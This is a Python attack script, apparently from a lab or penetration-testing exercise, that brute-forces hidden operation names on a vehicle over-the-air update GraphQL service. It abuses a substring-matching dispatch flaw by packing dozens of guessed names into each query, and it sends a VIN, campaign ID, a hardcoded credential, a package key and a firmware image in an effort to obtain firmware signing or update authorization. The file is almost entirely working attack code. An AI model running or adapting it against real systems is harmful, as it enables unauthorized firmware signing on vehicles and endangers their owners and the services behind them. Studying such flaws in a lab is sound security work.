#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Stage D: shotgun search of the /graphql matcher.

Facts established in 03_EVIDENCE/tsp/0211_graphql_dispatch_mechanism.txt:
  * dispatch is a substring test on the raw "query" string
    ("xx vehicleDiagnostics yy" dispatches, "VEHICLEDIAGNOSTICS" does not);
  * the variables object supplies the match keys (variables.vin).

So instead of one request per candidate name we can paste ~60 candidate names
into a single query string: if any of them is a registered operation the reply
stops being the guest fallback.  Bisect afterwards.
"""
import json, os, itertools, sys
import requests
from concurrent.futures import ThreadPoolExecutor

HERE = os.path.dirname(os.path.abspath(__file__))
EV = os.path.abspath(os.path.join(HERE, "..", "..", "03_EVIDENCE", "sign"))
URL = "http://10.225.139.2:8080/graphql"
VIN = "CV622697F82A936A1"
CAMP = "CAMP-243892C376D4CB2D5F826953"
CRED = "5e7f07b4a81153ecd5868cc02557f823"
PKGKEY = "3ac02bb40567fa14062cc768e22fefac3dd972aee87a3bf2d01419f026d573d0"
FW = open(os.path.join(HERE, "..", "..", "work", "bundle2", "x", "vcu-reference.bin"), "rb").read()
import base64, hashlib
FW_B64 = base64.b64encode(FW).decode()
FW_SHA = hashlib.sha256(FW).hexdigest()
GUEST = '{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'

# ---- candidate operation names -------------------------------------------------
STEMS = ["vehicle", "vehicles", "ota", "firmware", "fw", "vcu", "campaign", "campaigns",
         "update", "package", "image", "ecu", "software", "release", "artifact",
         "flashing", "flash", "boot", "bootloader", "authorization", "authorize",
         "signing", "signature", "sign", "digest", "attestation", "attest",
         "diagnostic", "diagnostics", "engineering", "fleet", "cloud", "rollback",
         "reference", "commit", "submission", "submit", "approval", "approve",
         "manifest", "payload", "bundle", "delivery", "provision", "provisioning"]
VERBS = ["sign", "signature", "signing", "signingRequest", "signRequest", "signUpdate",
         "signFirmware", "signPackage", "signImage", "signatureRequest",
         "update", "updateSign", "authorize", "authorization", "authorizeUpdate",
         "commit", "approve", "submit", "verify", "issue", "grant", "request",
         "", "Reference", "UpdateAuthorization", "SigningRequest"]

NAMES = set()
for s in STEMS:
    NAMES.add(s)
    for v in VERBS:
        if not v:
            continue
        NAMES.add(s + v[0].upper() + v[1:])
        NAMES.add(v[0].upper() + v[1:] + s[0].upper() + s[1:])
# extra hand-picked
NAMES |= set("""
sign signFirmware otaSign signUpdate vehicleUpdateSign firmwareSign vehicleSign
otaSignFirmware vehicleCampaign vehicleOta vehiclePackage vehicleVcu vehicleUpdate
vehicleSignature vehicleFirmwareSignature otaSignature updateSignature
vehicleUpdateSignature firmwareSignature vehicleOtaSignature vehicleVcuSignature
signVehicleUpdate signVehicleFirmware signOtaUpdate signVcuUpdate
vehicleUpdateAuthorization vehicleAuthorization vehicleOTAUpdate
otaUpdateAuthorization firmwareUpdateAuthorization campaignAuthorization
vehicleFirmwareUpdate vehicleSoftwareUpdate vehicleEcuUpdate
vcuReferenceShot vcuReferenceSignature signVcuReference
diagnosticTicket diagnosticTickets ticket tickets
firmwareTicket otaTicket updateTicket
""".split())
NAMES = sorted(n for n in NAMES if n)

VARS = {"vin": VIN, "campaignId": CAMP, "rollback": 2, "firmware": FW_B64,
        "sha256": FW_SHA, "digest": FW_SHA, "size": 1024, "address": "0x08040000",
        "packageKey": PKGKEY, "firmwareCredential": CRED}

VARSETS = [
    ("all", VARS),
    ("vin", {"vin": VIN}),
    ("vin+campaignId+rollback", {"vin": VIN, "campaignId": CAMP, "rollback": 2}),
]


def post(q, v):
    r = requests.post(URL, json={"query": q, "variables": v}, timeout=10)
    return r.status_code, r.text.strip()


def chunk(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


def main():
    print(f"[*] {len(NAMES)} candidate names, shotgun chunks of 50")
    hits = []
    jobs = []
    for vname, v in VARSETS:
        for ch in chunk(NAMES, 50):
            jobs.append((vname, v, ch))
    print(f"[*] {len(jobs)} shotgun requests")

    def run(job):
        vname, v, ch = job
        q = " ".join(ch)
        st, txt = post(q, v)
        return {"vars": vname, "chunk": ch, "status": st, "guest": txt == GUEST, "resp": txt[:600]}

    with ThreadPoolExecutor(max_workers=12) as ex:
        res = list(ex.map(run, jobs))
    json.dump(res, open(os.path.join(EV, "D_shotgun.json"), "w"), indent=1)

    bad = [r for r in res if not r["guest"]]
    print(f"[*] non-guest chunks: {len(bad)}")
    for r in bad:
        print("  !", r["vars"], r["status"], r["chunk"][:6], "...", r["resp"][:300])

    # bisect each non-guest chunk down to a single name
    found = []
    for r in bad:
        cand = r["chunk"]
        vname, v = [(n, d) for n, d in VARSETS if n == r["vars"]][0]
        while len(cand) > 1:
            mid = len(cand) // 2
            a, b = cand[:mid], cand[mid:]
            ga = post(" ".join(a), v)[1] == GUEST
            if not ga:
                cand = a
            else:
                cand = b
        name = cand[0]
        st, txt = post(name, v)
        found.append({"name": name, "vars": vname, "status": st, "resp": txt[:800]})
        print(f"  >>> SINGLE HIT: {name} (vars={vname}) -> {st} {txt[:300]}")

    json.dump(found, open(os.path.join(EV, "D_shotgun_bisected.json"), "w"), indent=1)
    print(f"[*] final hits: {[f['name'] for f in found]}")


if __name__ == "__main__":
    main()
